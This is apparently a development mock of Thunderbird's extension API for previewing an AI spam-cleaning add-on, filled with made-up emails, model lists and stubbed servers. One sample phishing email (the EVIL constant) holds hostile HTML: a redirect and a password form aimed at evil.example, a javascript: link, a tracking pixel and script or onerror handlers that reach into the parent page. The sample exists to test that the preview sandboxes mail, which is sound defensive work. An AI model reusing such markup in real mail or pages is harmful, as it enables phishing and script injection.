/* Dev mock of the Thunderbird MailExtension API for the browser preview.
 * NOT packaged into the extension. Start: sh scripts/dev.sh
 * URL parameters: ?n=5000   → extra random mails (performance test)
 *                 ?fresh=1  → empty settings (first start)
 *                 ?lang=de  → UI language (en, de, es; default en)
 *                 ?shot=…   → drive a view for store screenshots (scripts/screenshots.sh)
 * All data is made up – no real people, companies or addresses.
 */
(function () {
  const params = new URLSearchParams(location.search);
  const EXTRA = Math.min(Number(params.get("n")) || 0, 50000);
  const FRESH = params.has("fresh");
  const LANG = params.get("lang") || "en";
  const H = 3600000, D = 86400000, now = Date.now();
  let nextId = 1;
  const bodies = {};
  const attachments = {};
  const headers = {};

  function msg(folder, from, subject, ago, size, read, opts = {}) {
    const id = nextId++;
    if (opts.body) bodies[id] = opts.body;
    if (opts.att) attachments[id] = opts.att;
    if (opts.headers) headers[id] = opts.headers;
    return {
      id, folder, headerMessageId: "m" + id + "@mock.local", author: from, subject,
      date: new Date(now - ago), size, read, junk: false, flagged: false,
      recipients: opts.to || ["alex@example.com"], ccList: opts.cc || []
    };
  }

  const EVIL = '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><style>.hl{color:#c00;font-weight:bold}</style></head><body>' +
    "<h2>Congratulations!</h2><p class=\"hl\">You have won $1,000,000.</p>" +
    '<p>Please confirm <a href="javascript:alert(1)">here</a> or <a href="https://phish.example/login">here</a>.</p>' +
    '<img src="https://tracker.example/pixel.gif?u=alex" width="1" height="1">' +
    "<img src=\"x\" onerror=\"parent.document.title='PWNED'\">" +
    '<script>parent.document.title="PWNED2"<\/script>' +
    '<form action="https://evil.example/steal"><input name="pw"></form>' +
    "<p>Kind regards<br>Your prize team</p></body></html>";
  const NEWS = '<html><body style="margin:0"><table width="100%" style="background:#f4f4f7"><tr><td align="center"><table width="560" style="background:#fff;border-radius:12px;padding:24px;font-family:sans-serif"><tr><td><h1 style="margin:0 0 8px;color:#111">Weekly update</h1><p style="color:#444">Hi Alex, here is what happened this week. Our new feature is live!</p><p><a href="https://news.example/x" style="background:#5b5cf0;color:#fff;padding:10px 16px;border-radius:8px;text-decoration:none">Have a look</a></p><img src="https://cdn.news.example/hero.png" alt="Hero image" style="width:100%"><p style="color:#888;font-size:12px">You receive this because you signed up. <a href="https://news.example/unsubscribe?u=42">Unsubscribe</a></p></td></tr></table></td></tr></table></body></html>';
  const FASHION = "<html><body><h2>Autumn sale – 30% off everything</h2><p>Only this weekend in all our stores and online.</p>" +
    "<p style='color:#888;font-size:12px'>This email was sent to alex@example.com. To unsubscribe, send an email with the subject “unsubscribe” to leave@fashionhouse.example.</p></body></html>";
  const PLAIN = "Hi Alex,\n\nattached are the documents for Monday as discussed.\nCould you have a quick look by Friday?\n\nThanks & best regards\nMark";
  const LIST_HDR = (host, mail) => ({
    "List-Unsubscribe": [`<https://${host}/unsubscribe?u=42>` + (mail ? `, <mailto:${mail}?subject=unsubscribe>` : "")],
    "List-Unsubscribe-Post": ["List-Unsubscribe=One-Click"],
    "List-Id": [`<news.${host}>`]
  });

  const F = (name, path, type, sub) => ({ accountId: "a1", name, path, type: type || "", subFolders: sub || [] });
  const fInbox = F("Inbox", "/INBOX", "inbox", [F("Projects", "/INBOX/Projects"), F("Invoices", "/INBOX/Invoices")]);
  const root = { accountId: "a1", name: "alex@example.com", path: "/", subFolders: [
    fInbox, F("Drafts", "/Drafts", "drafts"), F("Sent", "/Sent", "sent"), F("Archives", "/Archives", "archives"),
    F("Spam", "/Spam", "junk"), F("Trash", "/Trash", "trash")] };
  const root2 = { accountId: "a2", name: "sam@example.org", path: "/", subFolders: [F("Inbox", "/INBOX", "inbox")] };

  const I = "/INBOX";
  const inbox = [
    msg(I, '"Mark Weber" <mark.weber@company.example>', "Documents for Monday", 2 * H, 482000, false, { body: { plain: PLAIN }, att: [{ name: "Offer_2026.pdf", size: 412000, contentType: "application/pdf" }, { name: "Budget.xlsx", size: 38000, contentType: "application/vnd.ms-excel" }] }),
    msg(I, '"Prize Center" <win@lucky-prize.ru>', "Congratulations – you have won!", 5 * H, 3100, false, { body: { html: EVIL }, headers: { "List-Unsubscribe": ["<https://lucky-prize.ru/stop>"] } }),
    msg(I, '"Product News" <news@newsletter.example>', "Weekly update: our new feature is live", 26 * H, 28100, true, { body: { html: NEWS, plain: "Weekly update – Hi Alex, here is what happened this week." }, headers: LIST_HDR("newsletter.example", "unsubscribe@newsletter.example") }),
    msg(I, '"Luxury Outlet" <sugzxnj@yahoo.com>', "Replica SHOP – 90% off today only", 3 * D, 1200, true, { body: { html: "<p>Cheap bags!!! <b>90% off</b></p>" } }),
    msg(I, '"Hot Offer" <no-reply@relant.ru>', "Pay $1 and win an iPhone", 4 * D, 2400, false, { body: { plain: "Click now!" } }),
    msg(I, '"Anna Smith" <anna@smith-family.example>', "BBQ on Saturday?", 6 * D, 920000, true, { body: { plain: "Hi! Are you free on Saturday for a BBQ? Anna" }, att: [{ name: "Invitation.jpg", size: 880000, contentType: "image/jpeg" }] }),
    msg(I, '"PETER WONG" <wongpeter72@yahoo.cn>', "acknowledge", 20 * D, 3300, true, { body: { plain: "Dear friend, I have a business proposal..." } }),
    msg(I, '"Code Hub" <noreply@codehub.example>', "[ai-mail-cleaner] Security alert", 45 * D, 7700, true, { body: { plain: "A new security advisory was published." } }),
    msg(I, '"Mesh Patch Legal Center" <contact@doomme.net>', "Woman received $3.5M settlement", 120 * D, 7100, true, { body: { plain: "Settlement info..." } }),
    msg(I, '"Rail Tickets" <booking@rail.example>', "Your ticket for Nov 12", 200 * D, 152000, true, { body: { plain: "Your booking is confirmed." }, att: [{ name: "Ticket.pdf", size: 140000, contentType: "application/pdf" }] }),
    msg(I, '"Cindy Trailor" <alcoholize983669@aliarefi.info>', "alex, Taxes due", 400 * D, 3000, true, { body: { plain: "Pay now." } }),
    msg(I, "sam@example.org", "(Re) Vacation planning", 800 * D, 12000, true, { body: { plain: "Let's plan next week." } }),
    msg(I, '"Fashion House" <newsletter@fashionhouse.example>', "Autumn sale: 30% off everything", 30 * H, 64000, false, { body: { html: FASHION } }),
    // older issues of the same newsletter (for "delete all mails of this newsletter")
    msg(I, '"Product News" <news@newsletter.example>', "Weekly update: faster search", 8 * D, 27400, true, { body: { html: NEWS }, headers: LIST_HDR("newsletter.example", "unsubscribe@newsletter.example") }),
    msg(I, '"Product News" <news@newsletter.example>', "Weekly update: dark mode", 15 * D, 26800, false, { body: { html: NEWS }, headers: LIST_HDR("newsletter.example", "unsubscribe@newsletter.example") }),
    msg(I, '"Product News" <news@newsletter.example>', "Weekly update: new pricing", 22 * D, 29100, false, { body: { html: NEWS }, headers: LIST_HDR("newsletter.example", "unsubscribe@newsletter.example") })
  ];
  inbox[3].junk = true; // "Luxury Outlet" – Thunderbird's own junk filter flagged it

  // random mails for load tests – made-up senders only
  const SENDERS = ["shop@deals24.biz", "info@parcel-ship24.com", "contact@city-utilities.example", "team@chat-tool.example",
    "newsletter@fashionhouse.example", "service@account-security.top", "no-reply@mailorder.example", "promo@casino-royal.top",
    "jobs@career-net.example", "hello@notes-app.example"];
  const SUBJ = ["Your order", "Last chance!", "Invoice", "Important information about your account", "Weekly digest", "You have won",
    "New message", "Exclusive offer", "Appointment confirmed", "Security notice"];
  for (let i = 0; i < EXTRA; i++) {
    const s = SENDERS[i % SENDERS.length];
    const isList = /newsletter|team@|hello@|deals24|mailorder/.test(s);
    inbox.push(msg(I, s, `${SUBJ[(i * 7) % SUBJ.length]} #${i + 1}`, (i * 37 % 900) * D / 3, 1000 + (i * 977) % 300000, i % 4 !== 0, {
      body: { plain: "Text " + i },
      att: i % 9 === 0 ? [{ name: "file.pdf", size: 20000, contentType: "application/pdf" }] : undefined,
      headers: isList ? LIST_HDR(s.split("@")[1], i % 2 ? "" : "leave@" + s.split("@")[1]) : undefined
    }));
  }
  const store = new Map([[I, inbox], ["/INBOX/Projects", []], ["/INBOX/Invoices", []], ["/Trash", []]]);
  const take = (ids) => {
    const set = new Set(ids), out = [];
    for (const [p, a] of store) store.set(p, a.filter((m) => (set.has(m.id) ? (out.push(m), false) : true)));
    return out;
  };
  const put = (path, list) => { if (!store.has(path)) store.set(path, []); for (const m of list) { m.folder = path; store.get(path).push(m); } };

  // existing scores (as if from an earlier scan)
  const cache = {};
  const preset = { 2: 99, 4: 97, 5: 94, 7: 88, 9: 91, 11: 96, 3: 42, 1: 3, 6: 2, 8: 12, 10: 5, 13: 34, 14: 38, 15: 45, 16: 41 };
  for (const [id, p] of Object.entries(preset)) cache["m" + id + "@mock.local"] = p;
  // screenshots: show the random mails as scored too (except for the scan dialog)
  if (params.get("shot") && params.get("shot") !== "scan") {
    for (const m of inbox) {
      if (m.headerMessageId in cache) continue;
      const sp = /deals24|casino|parcel-ship|account-security/.test(m.author) || /won|Last chance|Exclusive/.test(m.subject);
      cache[m.headerMessageId] = sp ? 80 + (m.id * 7) % 20 : (m.id * 13) % 45;
    }
  }
  const kv = FRESH ? {} : {
    settings: { schema: 2, provider: "decision", aiBaseUrl: "https://openrouter.ai/api/alpha/decisions", aiModel: "typesafe/jev-1.14", aiApiKey: "sk-or-dev", whitelist: ["company.example"],
      modelInfo: { decision: { id: "typesafe/jev-1.14", pricePrompt: 0.000000042, priceCompletion: 0, contextLength: 65536, free: false, local: false } } },
    scoreCache: cache
  };

  const page = (arr) => ({ id: null, messages: arr });
  const clone = (o) => JSON.parse(JSON.stringify(o));

  // ---- i18n: reads src/_locales/<lang>/messages.json like Thunderbird does ----
  function loadMsgs(l) {
    try {
      const x = new XMLHttpRequest();
      x.open("GET", `../_locales/${l}/messages.json`, false);
      x.send();
      return x.status === 200 ? JSON.parse(x.responseText) : {};
    } catch (_) { return {}; }
  }
  const MSG = { ...loadMsgs("en"), ...loadMsgs(LANG.split("-")[0]) };
  const i18n = {
    getUILanguage: () => LANG,
    getMessage: (key, subs) => {
      const e = MSG[key];
      if (!e) return "";
      const a = subs == null ? [] : Array.isArray(subs) ? subs : [subs];
      return e.message.replace(/\$(?:([1-9]\d*)|(\$+))/g, (m, idx, dollars) => (idx ? (a[Number(idx) - 1] ?? "") : dollars));
    }
  };

  window.__mock = { deleted: [], opened: null, compose: [], states: [], store };
  window.messenger = {
    i18n,
    accounts: { list: async () => [
      { id: "a1", name: "alex@example.com", rootFolder: root, folders: root.subFolders, identities: [{ id: "id1", email: "alex@example.com", name: "Alex" }] },
      { id: "a2", name: "sam@example.org", rootFolder: root2, folders: root2.subFolders, identities: [{ id: "id2", email: "sam@example.org", name: "Sam" }] }] },
    messages: {
      list: async (f) => page((store.get(f.path) || []).slice()),
      continueList: async () => page([]),
      query: async (q) => {
        let arr = (store.get(q.folder && q.folder.path) || []).slice();
        if (q.attachment === true) arr = arr.filter((m) => attachments[m.id]);
        if (q.headerMessageId) arr = arr.filter((m) => m.headerMessageId === q.headerMessageId);
        return page(arr);
      },
      listAttachments: async (id) => clone(attachments[id] || []).map((a, i) => ({ ...a, partName: "1." + (i + 2) })),
      getFull: async (id) => {
        await new Promise((r) => setTimeout(r, 180));
        const b = bodies[id] || {};
        const parts = [];
        if (b.plain) parts.push({ contentType: "text/plain", body: b.plain });
        if (b.html) parts.push({ contentType: "text/html", body: b.html });
        const h = {};
        for (const [k, v] of Object.entries(headers[id] || {})) h[k.toLowerCase()] = v;
        return { contentType: "multipart/alternative", headers: h, parts };
      },
      delete: async (ids) => { window.__mock.deleted.push(...ids); put("/Trash", take(ids)); },
      move: async (ids, f) => { put(f.path, take(ids)); }
    },
    folders: { create: async (p, nm) => F(nm, (p.path === "/" ? "" : p.path) + "/" + nm) },
    addressBooks: { list: async () => [
      { id: "ab1", name: "Personal Address Book", type: "addressBook", contacts: [
        { id: "c1", type: "contact", properties: { PrimaryEmail: "mark.weber@company.example", DisplayName: "Mark Weber" } },
        { id: "c2", type: "contact", properties: { vCard: "BEGIN:VCARD\r\nVERSION:4.0\r\nFN:Anna Smith\r\nEMAIL;PREF=1:anna@smith-family.example\r\nEND:VCARD" } }
      ] },
      { id: "ab2", name: "Collected Addresses", type: "addressBook", contacts: [
        { id: "c3", type: "contact", properties: { PrimaryEmail: "booking@rail.example" } }
      ] }] },
    compose: { beginNew: async (d) => { window.__mock.compose.push(d); return { id: 99 }; } },
    windows: { openDefaultBrowser: async (u) => { window.__mock.openedUrl = u; } },
    messageDisplay: { open: async (o) => { window.__mock.opened = o; } },
    permissions: { request: async (p) => { window.__mock.permReq = (window.__mock.permReq || []).concat([p]); return true; }, contains: async () => true },
    runtime: { openOptionsPage: async () => {}, sendMessage: async () => {}, getURL: (p) => "moz-extension://0a1b2c3d/" + (p || "") },
    // ?wr=0 → no webRequest (permission missing / API unavailable)
    webRequest: params.get("wr") === "0" ? undefined : { onBeforeSendHeaders: {
      addListener: (fn, filter, extra) => { window.__mock.wr = (window.__mock.wr || []).concat([{ fn, filter, extra }]); },
      removeListener: (fn) => { window.__mock.wr = (window.__mock.wr || []).filter((x) => x.fn !== fn); }
    } },
    storage: { local: {
      get: async (k) => (typeof k === "string" ? { [k]: kv[k] } : { ...kv }),
      set: async (o) => { Object.assign(kv, clone(o)); }
    } }
  };

  // ---- network mock for model lists and scoring ----
  const OR_DECISION = { data: [
    { id: "respan/span-01-lite:free", name: "Respan: Span-01 Lite (free)", context_length: 32768, description: "Behavior scoring model – free tier for high-volume evaluation.", pricing: { prompt: "0", completion: "0" } },
    { id: "respan/span-01", name: "Respan: Span-01", context_length: 32768, description: "Hyper-parallel reasoning classifier for unseen challenges.", pricing: { prompt: "0.00000002", completion: "0" } },
    { id: "typesafe/jev-1.14", name: "TypeSafe: Jev 1.14", context_length: 65536, description: "Non-generative decision model: choice, score, noul and box questions with calibrated probabilities.", pricing: { prompt: "0.000000042", completion: "0" } },
    { id: "typesafe/kev-4b", name: "TypeSafe: Kev 4B", context_length: 16384, description: "Small, fast decision model.", pricing: { prompt: "0.00000001", completion: "0" } }
  ] };
  const TEXT_ARCH = { modality: "text->text", input_modalities: ["text"], output_modalities: ["text"] };
  const OR_TEXT = { data: [
    ...Array.from({ length: 30 }, (_, i) => ({
      id: ["openai/gpt-4.1-mini", "anthropic/claude-haiku-4.5", "google/gemini-2.5-flash", "meta-llama/llama-3.3-70b-instruct", "mistralai/mistral-small-3.2", "qwen/qwen3-30b-a3b:free"][i % 6] + (i >= 6 ? "-v" + i : ""),
      name: "Model " + i, context_length: [128000, 200000, 1000000, 131072, 32768, 40960][i % 6],
      architecture: TEXT_ARCH,
      supported_parameters: i % 3 === 2 ? ["temperature", "max_tokens"] : ["temperature", "max_tokens", "response_format", "structured_outputs"],
      description: "General purpose chat model.",
      pricing: { prompt: String([0.0000004, 0.000001, 0.0000003, 0.0000001, 0.0000001, 0][i % 6]), completion: String([0.0000016, 0.000005, 0.0000025, 0.0000003, 0.0000003, 0][i % 6]) } })),
    // non-text models that the real OpenRouter list also contains – must not be offered
    { id: "google/lyria-3-pro-preview", name: "Google: Lyria 3 Pro Preview", context_length: 1048576, description: "Music generation.",
      architecture: { modality: "text->audio", input_modalities: ["text"], output_modalities: ["audio"] }, pricing: { prompt: "0", completion: "0" } },
    { id: "google/gemini-2.5-flash-image", name: "Google: Nano Banana", context_length: 32768, description: "Image generation.",
      architecture: { modality: "text+image->text+image", input_modalities: ["text", "image"], output_modalities: ["image", "text"] }, pricing: { prompt: "0.0000003", completion: "0.0000025" } },
    { id: "openai/sora-2", name: "OpenAI: Sora 2", context_length: 0, description: "Video.", architecture: { output_modalities: ["video"] }, pricing: { prompt: "0", completion: "0" } },
    // a text model that answers in prose instead of JSON (tests the error message)
    { id: "acme/chatty-1", name: "Acme: Chatty 1", context_length: 8192, description: "Very talkative.", architecture: TEXT_ARCH, pricing: { prompt: "0.0000001", completion: "0.0000001" } },
    // what LM Studio lists when a decision GGUF is loaded (no modality info) – must be hidden
    { id: "jev-style-0.8b-decision-v3", object: "model", owned_by: "organization_owner" }
  ] };
  const OLLAMA_TAGS = { models: [
    { name: "llama3.2:3b", size: 2019393189, details: { family: "llama", parameter_size: "3.2B", quantization_level: "Q4_K_M" }, capabilities: ["completion", "tools"] },
    { name: "qwen2.5:7b", size: 4683087332, details: { family: "qwen2", parameter_size: "7.6B", quantization_level: "Q4_K_M" }, capabilities: ["completion", "tools"] },
    { name: "gemma3:12b", size: 8149190253, details: { family: "gemma3", parameter_size: "12.2B", quantization_level: "Q4_K_M" }, capabilities: ["completion", "vision"] },
    // Ollama ≥ 0.40: decision models (served via /v1/systemone), and an embedding model
    { name: "autotrust-jev:latest", size: 11231497116, details: { format: "safetensors", quantization_level: "mxfp8" }, capabilities: ["decision"] },
    { name: "nomic-embed-text:latest", size: 274302450, details: { family: "nomic-bert", parameter_size: "137M", quantization_level: "F16" }, capabilities: ["embedding"] }
  ] };
  // Ollaya's /api/tags (docs/api.md §7.4): the router "laya" and its two targets, plus a decoder
  const OLLAYA_TAGS = { models: [
    { name: "laya:latest", model: "laya:latest", size: 11862, details: { format: "router", family: "laya", families: ["laya"], parameter_size: "", quantization_level: "" } },
    { name: "laya:multilingual", model: "laya:multilingual", size: 687214992, details: { format: "onnx", family: "laya", families: ["laya"], parameter_size: "322M", quantization_level: "F16" } },
    { name: "laya:en", model: "laya:en", size: 845897529, details: { format: "onnx", family: "laya", families: ["laya"], parameter_size: "421M", quantization_level: "F16" } },
    { name: "decider:0.8b", model: "decider:0.8b", size: 1712345678, details: { format: "onnx", family: "decider", families: ["decider"], parameter_size: "0.8B", quantization_level: "F16/F32" } }
  ] };
  const json = (o, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(o), json: async () => o });
  const wait = (ms, signal) => new Promise((res, rej) => {
    const t = setTimeout(res, ms);
    if (signal) signal.addEventListener("abort", () => { clearTimeout(t); rej(Object.assign(new Error("aborted"), { name: "AbortError" })); });
  });
  const spammy = (s) => /won|win |prize|off today|casino|replica|iphone|settlement|taxes|last chance|gewinn|rabatt|\.ru|\.cn|\.top|\.biz/i.test(s);
  window.fetch = async (url, opts = {}) => {
    const u = String(url);
    // ?ollama=403 / ?ollaya=403 → the server refuses the moz-extension Origin (like the real apps
    // without OLLAMA_ORIGINS / OLLAYA_ORIGINS); registered webRequest listeners get to rewrite the
    // header first, as in Thunderbird
    const guarded = (params.get("ollama") === "403" && /\/\/(localhost|127\.0\.0\.1):11434\//.test(u)) ||
      (params.get("ollaya") === "403" && /\/\/(localhost|127\.0\.0\.1):11435\//.test(u));
    if (guarded) {
      let headers = [{ name: "Origin", value: "moz-extension://0a1b2c3d" }, { name: "Content-Type", value: "application/json" }];
      for (const l of window.__mock.wr || []) {
        const pat = new RegExp("^" + l.filter.urls[0].replace(/[.?+^$|()[\]{}\\]/g, "\\$&").replace("/*", "(:\\d+)?/.*").replace(/\*/g, ".*"));
        if (!pat.test(u)) continue;
        const r = l.fn({ url: u, originUrl: "moz-extension://0a1b2c3d/ui/cleaner.html", requestHeaders: headers.map((h) => ({ ...h })) });
        if (r && r.requestHeaders) headers = r.requestHeaders;
      }
      const origin = (headers.find((h) => h.name.toLowerCase() === "origin") || {}).value;
      window.__mock.origins = (window.__mock.origins || []).concat([origin]);
      if (origin && origin !== new URL(u).origin) {
        return u.includes(":11435/") ? json({ error: "origin not allowed", code: "FORBIDDEN" }, 403) : new Response("", { status: 403 });
      }
    }
    // Ollaya (127.0.0.1:11435): ?ollaya=down → not running, empty → no models pulled,
    // nolaya → the configured model isn't pulled (404 MODEL_NOT_FOUND)
    if (/\/\/(127\.0\.0\.1|localhost):11435\//.test(u)) {
      const oy = params.get("ollaya");
      if (oy === "down") throw new TypeError("NetworkError when attempting to fetch resource.");
      if (u.endsWith("/api/tags")) return json(oy === "empty" ? { models: [] } : OLLAYA_TAGS);
      if (/\/(api\/decide|v1\/systemone)$/.test(u)) {
        const b = JSON.parse(opts.body || "{}");
        await wait(30, opts.signal);
        (window.__mock.decide = window.__mock.decide || []).push({ url: u, body: b });
        const known = OLLAYA_TAGS.models.map((m) => m.name);
        const name = /:/.test(b.model || "") ? b.model : b.model + ":latest";
        if (oy === "nolaya" || oy === "empty" || !known.includes(name)) {
          return json({ error: `model "${b.model}" not found, try pulling it first`, code: "MODEL_NOT_FOUND" }, 404);
        }
        const state = String(b.state || "");
        const routed = /^laya(:latest)?$/.test(b.model) ? (/[äöüß]|Hallo|Ihre|Sie /.test(state) ? "laya:multilingual" : "laya:en") : name;
        const mail = state.split("\n\nContext")[0].split("\n\nEmail body")[0] + (state.split("Email body: ")[1] || "");
        return json({ model: routed, answers: { spam: { type: "noul", noul: spammy(mail) ? 0.8731 : 0.0214 } },
          usage: { input_tokens: 140, output_tokens: 0 },
          routing: routed !== name ? { router: "laya:latest", model: routed, route: routed === "laya:en" ? "english" : "multilingual", reason: "mock" } : null,
          state_truncated: state.length > 1600, done_reason: "decide" });
      }
      return json({ error: "not found", code: "NOT_FOUND" }, 404);
    }
    // local Jev-compatible server (jev-style serve): ?jev=403 → origin check, ?jev=down → not running
    if (/\/\/(127\.0\.0\.1|localhost):876\d\//.test(u)) {
      const jev = params.get("jev");
      if (jev === "down") throw new TypeError("NetworkError when attempting to fetch resource.");
      if (jev === "403") return json({ error: { code: "forbidden_origin", message: "cross-site requests from '0a1b2c3d' are refused: this is a local server" } }, 403);
      if (u.endsWith("/v1/models")) return json({ object: "list", data: [{ id: "jev-style-2b-decision-v4", context_tokens: 32768, head_max_tokens: 2048, backend: "mlx", images: false, box: false }],
        models: [{ name: "jev-style-2b-decision-v4", release_date: "2026-10-01", description: "" }] });
      if (u.endsWith("/v1/systemone")) {
        const b = JSON.parse(opts.body || "{}");
        await wait(60, opts.signal);
        (window.__mock.systemone = window.__mock.systemone || []).push({ url: u, body: b });
        return json({ model: "jev-style-2b-decision-v4", backend: "mlx",
          answers: { spam: { type: "noul", noul: spammy(String(b.state).split("\n\nContext")[0]) ? 0.91 : 0.04 } } });
      }
      return json({ error: { code: "not_found", message: "Not Found" } }, 404);
    }
    // LM Studio (localhost:1234): its model list, and the one-token log-prob readout of Jev-Style 2B v1.
    // Response shape as OpenAI / LM Studio: choices[0].logprobs.content[0].top_logprobs
    if (/\/\/(127\.0\.0\.1|localhost):1234\//.test(u)) {
      if (u.endsWith("/models")) return json({ object: "list", data: ["jev-style-qwen3.5-2b-decision", "jev-style-0.8b-decision-v3", "qwen/qwen3-8b", "text-embedding-nomic-embed-text-v1.5"]
        .map((id) => ({ id, object: "model", owned_by: "organization_owner" })) });
      const b = JSON.parse(opts.body || "{}");
      if (b.logprobs) {
        await wait(40, opts.signal);
        const prompt = String(b.messages && b.messages[0] && b.messages[0].content || "");
        (window.__mock.letters = window.__mock.letters || []).push({ model: b.model, max_tokens: b.max_tokens, top: b.top_logprobs, prompt });
        const state = (prompt.split("[State]\n")[1] || "").split("\n\n[Question]")[0].split("\n\nContext")[0];
        // a v3 GGUF behind the stock chat template: no option letters among the candidates
        const top = /0\.8b|v3/.test(b.model)
          ? [{ token: "<think>", logprob: -0.2 }, { token: " yes", logprob: -2.1 }, { token: "yes", logprob: -3.0 }]
          : spammy(state)
            ? [{ token: "A", logprob: -0.07 }, { token: "B", logprob: -2.7 }, { token: " A", logprob: -7.5 }]
            : [{ token: "B", logprob: -0.03 }, { token: "A", logprob: -3.6 }, { token: "\n", logprob: -9 }];
        if (params.get("lm") === "nologprobs") return json({ model: b.model, choices: [{ index: 0, message: { role: "assistant", content: top[0].token }, logprobs: null, finish_reason: "length" }] });
        return json({ model: b.model, choices: [{ index: 0, message: { role: "assistant", content: top[0].token },
          logprobs: { content: [{ token: top[0].token, logprob: top[0].logprob, top_logprobs: top }] }, finish_reason: "length" }] });
      }
    }
    if (u.includes("/api/v1/models")) return json(u.includes("decisions") ? OR_DECISION : OR_TEXT);
    if (u.endsWith("/api/tags")) return json(OLLAMA_TAGS);
    if (u.endsWith("/models")) return json(OR_TEXT);
    const body = JSON.parse(opts.body || "{}");
    await wait(120, opts.signal);
    if (u.includes("/decisions")) {
      window.__mock.states.push(body.state); // lets tests check what the model sees
      return json({ model: body.model, answers: { spam: { type: "noul", noul: spammy(body.state.split("\n\nContext")[0]) ? 0.95 : 0.06 } } });
    }
    // LLM (OpenAI-compatible / Ollama): answer the batch JSON
    const userMsg = (body.messages || []).find((m) => m.role === "user");
    let items = [];
    try { items = JSON.parse(userMsg.content.slice(userMsg.content.indexOf("["))); } catch (_) {}
    window.__mock.chatBodies = (window.__mock.chatBodies || []).concat([{ model: body.model, response_format: body.response_format, temperature: body.temperature }]);
    if (body.model === "google/lyria-3-pro-preview") return json({ choices: [{ message: { content: null, audio: { data: "UklGR…" } } }] });
    if (body.model === "acme/chatty-1") return json({ choices: [{ message: { content: "Sure! I looked at the emails. The first one seems a bit suspicious, the others look fine to me." } }] });
    if (body.model === "openai/o4-mini" && body.temperature !== undefined) // reasoning models reject temperature
      return json({ error: { message: "Unsupported value: 'temperature' does not support 0 with this model. Only the default (1) value is supported." } }, 400);
    const out = JSON.stringify({ results: items.map((e) => ({ i: e.i, p: spammy(e.from + " " + e.subject) ? 93 : 7 })) });
    if (u.includes("/api/chat")) return json({ message: { content: out } });
    return json({ choices: [{ message: { content: out } }] });
  };

  // ---- ?shot=… drives a view for store screenshots (scripts/screenshots.sh) ----
  const SHOT = params.get("shot");
  if (SHOT) {
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
    const q = (s) => document.querySelector(s);
    const click = (s) => { const el = q(s); if (el) el.click(); return el; };
    const row = (text) => [...document.querySelectorAll("#mailBody tr[data-id]")].find((r) => r.textContent.includes(text));
    window.addEventListener("load", async () => {
      // no animations – headless Chrome would freeze them at frame 0
      const st = document.createElement("style");
      st.textContent = "*,*::before,*::after{animation:none!important;transition:none!important}";
      document.head.appendChild(st);
      await sleep(900);
      if (SHOT !== "newsletter") click(".th-spam"); // sort by spam
      await sleep(150);
      switch (SHOT) {
        case "select":
          click('.chip[data-preset="spam"]');
          await sleep(100);
          click("#selectFilteredBtn");
          break;
        case "preview": {
          const r = row("Prize Center");
          if (r) r.querySelector(".pv-btn").click();
          break;
        }
        case "newsletter": {
          await sleep(1200);                    // let the newsletter probe finish
          const r = row("Product News");
          const tag = r && r.querySelector(".nl-tag");
          if (tag) tag.click();                 // opens the "web page / email" menu
          break;
        }
        case "settings":
          click("#settingsBtn");
          break;
        case "picker":
          click("#settingsBtn");
          await sleep(150);
          click("#mPick");
          break;
        case "ollaya": // settings: decision model on this computer, with the setup note
          click("#settingsBtn");
          await sleep(150);
          click('.prov[data-kind="decision"]');
          await sleep(100);
          { const sel = document.getElementById("presetSelect");
            sel.value = "ollaya"; sel.dispatchEvent(new Event("change", { bubbles: true })); }
          break;
        case "scan":
          click("#scanBtn");
          break;
      }
      await sleep(1500);
      document.body.dataset.shotReady = "1";
    });
  }
})();
